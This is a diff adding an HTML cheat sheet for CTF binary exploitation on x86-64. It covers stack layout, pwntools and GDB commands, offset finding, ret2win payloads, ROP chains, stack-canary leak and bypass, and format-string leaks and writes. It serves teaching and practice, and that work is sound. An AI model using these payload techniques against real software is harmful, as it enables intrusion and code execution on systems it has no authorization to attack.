@@ -1,0 +1,244 @@
+
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: var(--font-mono); font-size: 13px; }
+.sheet { padding: 1rem 0; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+.card { background: var(--color-background-primary); border: 0.5px solid var(--color-border-secondary); border-radius: var(--border-radius-md); padding: 10px 12px; }
+.card.full { grid-column: 1 / -1; }
+h2 { font-size: 11px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.08em; color: var(--color-text-secondary); margin-bottom: 8px; border-bottom: 0.5px solid var(--color-border-tertiary); padding-bottom: 5px; }
+code { font-family: var(--font-mono); font-size: 12px; color: var(--color-text-primary); }
+.line { display: flex; gap: 8px; margin-bottom: 4px; align-items: flex-start; }
+.line code { color: #1D9E75; white-space: pre; flex-shrink: 0; }
+.line .c { color: var(--color-text-secondary); font-size: 11px; font-family: var(--font-sans); line-height: 1.4; }
+.tag { display: inline-block; font-size: 10px; font-weight: 500; padding: 1px 6px; border-radius: 4px; margin-right: 4px; }
+.tag.r { background: #FAECE7; color: #993C1D; }
+.tag.g { background: #EAF3DE; color: #3B6D11; }
+.tag.b { background: #E6F1FB; color: #185FA5; }
+.tag.p { background: #EEEDFE; color: #534AB7; }
+table { width: 100%; border-collapse: collapse; }
+td { padding: 3px 6px; font-size: 12px; vertical-align: top; }
+td:first-child { color: #1D9E75; font-family: var(--font-mono); white-space: nowrap; }
+td:last-child { color: var(--color-text-secondary); font-size: 11px; font-family: var(--font-sans); }
+tr:nth-child(even) td { background: var(--color-background-secondary); }
+.sep { height: 5px; }
+.kv { display: flex; justify-content: space-between; align-items: center; padding: 2px 0; border-bottom: 0.5px solid var(--color-border-tertiary); }
+.kv:last-child { border-bottom: none; }
+.kv .k { color: #1D9E75; font-family: var(--font-mono); font-size: 12px; }
+.kv .v { color: var(--color-text-secondary); font-size: 11px; font-family: var(--font-sans); text-align: right; max-width: 60%; }
+.stack-diagram { display: flex; flex-direction: column; gap: 2px; }
+.stack-row { display: flex; align-items: center; gap: 8px; }
+.stack-box { flex: 1; padding: 3px 8px; border: 0.5px solid var(--color-border-secondary); border-radius: 3px; font-size: 11px; text-align: center; }
+.stack-label { font-size: 10px; color: var(--color-text-secondary); width: 60px; text-align: right; flex-shrink: 0; }
+.arrow { font-size: 10px; color: var(--color-text-tertiary); width: 14px; text-align: center; flex-shrink: 0; }
+</style>
+<h2 class="sr-only" style="position:absolute;left:-9999px">Buffer overflow CTF cheatsheet: pwntools, GDB, registers, and exploit techniques</h2>
+
+<div class="sheet">
+
+<div class="card full">
+  <h2>Stack layout (x86-64) — low addr at bottom, high at top</h2>
+  <div class="stack-diagram">
+    <div class="stack-row"><div class="stack-label">high addr</div><div class="stack-box" style="background:var(--color-background-secondary)">caller frame / args</div><div class="arrow"></div></div>
+    <div class="stack-row"><div class="stack-label">RIP →</div><div class="stack-box" style="border-color:#E24B4A;color:#A32D2D;font-weight:500">saved return address &nbsp;&nbsp;← overwrite target</div><div class="arrow">↑</div></div>
+    <div class="stack-row"><div class="stack-label">RBP →</div><div class="stack-box" style="border-color:#378ADD;color:#185FA5">saved RBP (8 bytes)</div><div class="arrow"></div></div>
+    <div class="stack-row"><div class="stack-label"></div><div class="stack-box" style="border-color:#8F77DD;color:#534AB7">canary (8 bytes, if enabled)</div><div class="arrow"></div></div>
+    <div class="stack-row"><div class="stack-label">RSP →</div><div class="stack-box" style="background:var(--color-background-secondary)">local vars / buffer &nbsp;&nbsp;← input goes here</div><div class="arrow">↓</div></div>
+    <div class="stack-row"><div class="stack-label">low addr</div><div class="stack-box" style="opacity:0.4">grows downward</div><div class="arrow"></div></div>
+  </div>
+</div>
+
+<div class="card">
+  <h2>Key registers</h2>
+  <table>
+    <tr><td>RIP</td><td>instruction pointer — next instruction to execute (the "return address")</td></tr>
+    <tr><td>RSP</td><td>stack pointer — top of stack (lowest addr)</td></tr>
+    <tr><td>RBP</td><td>base pointer — bottom of current frame</td></tr>
+    <tr><td>RAX</td><td>return value of functions</td></tr>
+    <tr><td>RDI</td><td>1st argument</td></tr>
+    <tr><td>RSI</td><td>2nd argument</td></tr>
+    <tr><td>RDX</td><td>3rd argument</td></tr>
+    <tr><td>RCX</td><td>4th argument</td></tr>
+    <tr><td>R8</td><td>5th argument</td></tr>
+    <tr><td>R9</td><td>6th argument</td></tr>
+  </table>
+</div>
+
+<div class="card">
+  <h2>pwntools — connect & send</h2>
+  <div class="line"><code>from pwn import *</code><span class="c"></span></div>
+  <div class="sep"></div>
+  <div class="line"><code>p = remote('host', port)</code><span class="c">remote connection</span></div>
+  <div class="line"><code>p = process('./bin')</code><span class="c">local process</span></div>
+  <div class="line"><code>p = gdb.debug('./bin', 'b main')</code><span class="c">launch with GDB attached</span></div>
+  <div class="sep"></div>
+  <div class="line"><code>p.sendline(payload)</code><span class="c">send + \n</span></div>
+  <div class="line"><code>p.send(payload)</code><span class="c">send raw (no \n)</span></div>
+  <div class="line"><code>p.recvuntil(b':')</code><span class="c">read until pattern</span></div>
+  <div class="line"><code>p.recvline()</code><span class="c">read one line</span></div>
+  <div class="line"><code>p.interactive()</code><span class="c">hand control to terminal</span></div>
+  <div class="sep"></div>
+  <div class="line"><code>elf = ELF('./bin')</code><span class="c">load binary</span></div>
+  <div class="line"><code>elf.symbols['win']</code><span class="c">address of function</span></div>
+  <div class="line"><code>elf.got['puts']</code><span class="c">GOT entry (libc leak)</span></div>
+  <div class="line"><code>elf.plt['puts']</code><span class="c">PLT stub address</span></div>
+  <div class="sep"></div>
+  <div class="line"><code>p64(addr)</code><span class="c">pack as 64-bit little-endian</span></div>
+  <div class="line"><code>p32(addr)</code><span class="c">pack as 32-bit little-endian</span></div>
+  <div class="line"><code>u64(data)</code><span class="c">unpack 8 bytes → int</span></div>
+</div>
+
+<div class="card">
+  <h2>Finding offset to RIP</h2>
+  <div class="line"><code>cyclic(200)</code><span class="c">generate 200-byte De Bruijn pattern</span></div>
+  <div class="line"><code>cyclic_find(0x6161616b)</code><span class="c">find offset from crashed RIP value</span></div>
+  <div class="sep"></div>
+  <div style="font-size:11px; color:var(--color-text-secondary); font-family:var(--font-sans); margin-bottom:6px">Workflow:</div>
+  <div class="line"><code>p.sendline(cyclic(200))</code><span class="c">crash the program</span></div>
+  <div class="line"><code># in GDB: info reg rip</code><span class="c">note the bad RIP value</span></div>
+  <div class="line"><code>cyclic_find(rip_value)</code><span class="c">= offset to RIP</span></div>
+  <div class="sep"></div>
+  <div style="font-size:11px; color:var(--color-text-secondary); font-family:var(--font-sans)">GDB alternative: <code style="color:#1D9E75">x/100wx $rsp</code> → find pattern bytes, calculate manually</div>
+</div>
+
+<div class="card">
+  <h2>GDB cheatsheet</h2>
+  <table>
+    <tr><td>gdb ./bin</td><td>open binary</td></tr>
+    <tr><td>r</td><td>run</td></tr>
+    <tr><td>r &lt; input.txt</td><td>run with file input</td></tr>
+    <tr><td>b *0xaddr</td><td>breakpoint at address</td></tr>
+    <tr><td>b main</td><td>breakpoint at symbol</td></tr>
+    <tr><td>c</td><td>continue</td></tr>
+    <tr><td>ni / si</td><td>next/step instruction</td></tr>
+    <tr><td>info reg</td><td>all registers</td></tr>
+    <tr><td>info reg rip rsp</td><td>specific registers</td></tr>
+    <tr><td>x/100wx $rsp</td><td>100 words (hex) from RSP</td></tr>
+    <tr><td>x/100gx $rsp</td><td>100 giant (64-bit) from RSP</td></tr>
+    <tr><td>x/s 0xaddr</td><td>string at address</td></tr>
+    <tr><td>disas func</td><td>disassemble function</td></tr>
+    <tr><td>p &win</td><td>print address of win()</td></tr>
+    <tr><td>vmmap</td><td>memory map (pwndbg)</td></tr>
+    <tr><td>checksec</td><td>binary protections</td></tr>
+    <tr><td>stack 20</td><td>show 20 stack frames (pwndbg)</td></tr>
+  </table>
+</div>
+
+<div class="card">
+  <h2>ret2win — basic overflow</h2>
+  <div style="font-size:11px;color:var(--color-text-secondary);font-family:var(--font-sans);margin-bottom:6px">Fill buffer → overwrite saved RBP (8B) → overwrite RIP with win() addr</div>
+  <div class="line"><code>offset = cyclic_find(...)</code><span class="c">e.g. 40</span></div>
+  <div class="line"><code>win = elf.symbols['win']</code><span class="c">or p&amp;win in GDB</span></div>
+  <div class="line"><code>payload  = b'A' * offset</code><span class="c">fill to saved RBP</span></div>
+  <div class="line"><code>payload += b'B' * 8</code><span class="c">overwrite saved RBP</span></div>
+  <div class="line"><code>payload += p64(win)</code><span class="c">overwrite RIP</span></div>
+  <div class="sep"></div>
+  <div style="font-size:11px;color:var(--color-text-secondary);font-family:var(--font-sans)">⚠ If MOVAPS crash (stack alignment): prepend a <code style="color:#1D9E75">ret</code> gadget before win addr</div>
+  <div class="line"><code>ret = rop.find_gadget(['ret'])[0]</code><span class="c"></span></div>
+  <div class="line"><code>payload += p64(ret) + p64(win)</code><span class="c"></span></div>
+</div>
+
+<div class="card">
+  <h2>ROP — gadgets & chains</h2>
+  <div class="line"><code>rop = ROP(elf)</code><span class="c">init ROP object</span></div>
+  <div class="line"><code>rop.find_gadget(['pop rdi','ret'])</code><span class="c">find gadget address</span></div>
+  <div class="line"><code>rop.rdi = addr</code><span class="c">set RDI (1st arg)</span></div>
+  <div class="sep"></div>
+  <div style="font-size:11px;color:var(--color-text-secondary);font-family:var(--font-sans);margin-bottom:6px">Manual ROP chain to call win(arg):</div>
+  <div class="line"><code>pop_rdi = rop.find_gadget(</code><span class="c"></span></div>
+  <div class="line"><code>&nbsp;&nbsp;['pop rdi','ret'])[0]</code><span class="c"></span></div>
+  <div class="line"><code>payload  = b'A' * offset</code><span class="c"></span></div>
+  <div class="line"><code>payload += b'B' * 8</code><span class="c">saved RBP</span></div>
+  <div class="line"><code>payload += p64(pop_rdi)</code><span class="c">gadget: pop rdi; ret</span></div>
+  <div class="line"><code>payload += p64(arg_value)</code><span class="c">value → RDI</span></div>
+  <div class="line"><code>payload += p64(win)</code><span class="c">call win(arg)</span></div>
+  <div class="sep"></div>
+  <div style="font-size:11px;color:var(--color-text-secondary);font-family:var(--font-sans)">Shell: chain pop rdi → /bin/sh addr → system()</div>
+</div>
+
+<div class="card">
+  <h2>Stack canary — leak & bypass</h2>
+  <div style="font-size:11px;color:var(--color-text-secondary);font-family:var(--font-sans);margin-bottom:6px">Canary = random 8-byte value, LSB always <code style="color:#1D9E75">\x00</code>. Placed between locals and saved RBP. Checked before ret — kills process if changed.</div>
+  <div class="line"><code># leak via printf/puts</code><span class="c"></span></div>
+  <div class="line"><code># fill buffer to canary offset</code><span class="c">use cyclic to find</span></div>
+  <div class="line"><code># read leaked bytes (8B)</code><span class="c">recvuntil / recvline</span></div>
+  <div class="line"><code>canary = u64(leak.ljust(8,b'\x00'))</code><span class="c">unpack</span></div>
+  <div class="sep"></div>
+  <div class="line"><code>payload  = b'A' * buf_offset</code><span class="c">to canary</span></div>
+  <div class="line"><code>payload += p64(canary)</code><span class="c">restore canary!</span></div>
+  <div class="line"><code>payload += b'B' * 8</code><span class="c">saved RBP</span></div>
+  <div class="line"><code>payload += p64(win)</code><span class="c">overwrite RIP</span></div>
+  <div class="sep"></div>
+  <div style="font-size:11px;color:var(--color-text-secondary);font-family:var(--font-sans)">GDB: <code style="color:#1D9E75">x/gx $rbp-8</code> shows canary value</div>
+</div>
+
+<div class="card">
+  <h2>printf format string</h2>
+  <div style="font-size:11px;color:var(--color-text-secondary);font-family:var(--font-sans);margin-bottom:6px">Vulnerable: <code style="color:#E24B4A">printf(buf)</code> — no format string arg.</div>
+  <table>
+    <tr><td>%p</td><td>print pointer (hex) — leak stack values</td></tr>
+    <tr><td>%x</td><td>print hex (32-bit)</td></tr>
+    <tr><td>%s</td><td>dereference as string</td></tr>
+    <tr><td>%n</td><td>write # chars printed to pointer arg</td></tr>
+    <tr><td>%7$p</td><td>direct param: leak 7th arg on stack</td></tr>
+    <tr><td>%7$s</td><td>dereference 7th arg as string</td></tr>
+  </table>
+  <div class="sep"></div>
+  <div style="font-size:11px;color:var(--color-text-secondary);font-family:var(--font-sans);margin-bottom:4px">Find offset to your input on the stack:</div>
+  <div class="line"><code>AAAA%1$p %2$p %3$p...</code><span class="c">look for 0x41414141</span></div>
+  <div class="sep"></div>
+  <div style="font-size:11px;color:var(--color-text-secondary);font-family:var(--font-sans);margin-bottom:4px">Leak canary (if it's at e.g. offset 11):</div>
+  <div class="line"><code>p.sendline(b'%11$p')</code><span class="c">prints canary as hex ptr</span></div>
+  <div class="sep"></div>
+  <div style="font-size:11px;color:var(--color-text-secondary);font-family:var(--font-sans);margin-bottom:4px">Write with pwntools helper:</div>
+  <div class="line"><code>payload = fmtstr_payload(offset,</code><span class="c"></span></div>
+  <div class="line"><code>&nbsp;&nbsp;{addr: value})</code><span class="c">writes value to addr</span></div>
+</div>
+
+<div class="card">
+  <h2>checksec — protections at a glance</h2>
+  <table>
+    <tr><td>NX enabled</td><td>stack not executable → need ROP</td></tr>
+    <tr><td>Canary found</td><td>must leak canary first</td></tr>
+    <tr><td>PIE enabled</td><td>code randomized → need leak to get addresses</td></tr>
+    <tr><td>RELRO Full</td><td>GOT not writable</td></tr>
+    <tr><td>RELRO Partial</td><td>GOT writable → can overwrite func ptrs</td></tr>
+  </table>
+  <div class="sep"></div>
+  <div class="line"><code>checksec --file=./bin</code><span class="c">in terminal</span></div>
+  <div class="line"><code>checksec</code><span class="c">inside GDB (pwndbg)</span></div>
+</div>
+
+<div class="card">
+  <h2>Find addresses</h2>
+  <div class="line"><code>elf.symbols['func']</code><span class="c">pwntools: function addr</span></div>
+  <div class="line"><code>p &func</code><span class="c">GDB: print address</span></div>
+  <div class="line"><code>disas func</code><span class="c">GDB: show func asm</span></div>
+  <div class="line"><code>info functions</code><span class="c">GDB: list all functions</span></div>
+  <div class="line"><code>nm ./bin | grep func</code><span class="c">shell: symbol table</span></div>
+  <div class="line"><code>objdump -d ./bin | grep func</code><span class="c">disassemble</span></div>
+  <div class="sep"></div>
+  <div style="font-size:11px;color:var(--color-text-secondary);font-family:var(--font-sans)">PIE base: leak any addr, subtract known offset from ELF: <code style="color:#1D9E75">leak - elf.symbols['known']</code></div>
+</div>
+
+<div class="card full">
+  <h2>Pwntools script skeleton</h2>
+  <div class="line"><code>from pwn import *</code><span class="c"></span></div>
+  <div class="line"><code>elf = context.binary = ELF('./bin')</code><span class="c">sets arch automatically</span></div>
+  <div class="line"><code>context.log_level = 'debug'</code><span class="c">verbose output (remove for clean)</span></div>
+  <div class="sep"></div>
+  <div class="line"><code># p = process('./bin')</code><span class="c">local test</span></div>
+  <div class="line"><code># p = gdb.debug('./bin', 'b *0x401234')</code><span class="c">local + GDB</span></div>
+  <div class="line"><code>p = remote('host', 1337)</code><span class="c">remote</span></div>
+  <div class="sep"></div>
+  <div class="line"><code>rop = ROP(elf)</code><span class="c"></span></div>
+  <div class="line"><code>offset = 40</code><span class="c">found via cyclic</span></div>
+  <div class="line"><code>win = elf.symbols['win']</code><span class="c"></span></div>
+  <div class="sep"></div>
+  <div class="line"><code>payload  = flat({offset: p64(win)})</code><span class="c">OR manually build below</span></div>
+  <div class="line"><code>payload  = b'A' * offset + b'B'*8 + p64(win)</code><span class="c"></span></div>
+  <div class="sep"></div>
+  <div class="line"><code>p.sendlineafter(b':', payload)</code><span class="c">send after prompt</span></div>
+  <div class="line"><code>p.interactive()</code><span class="c">get shell</span></div>
+</div>
+
+</div>
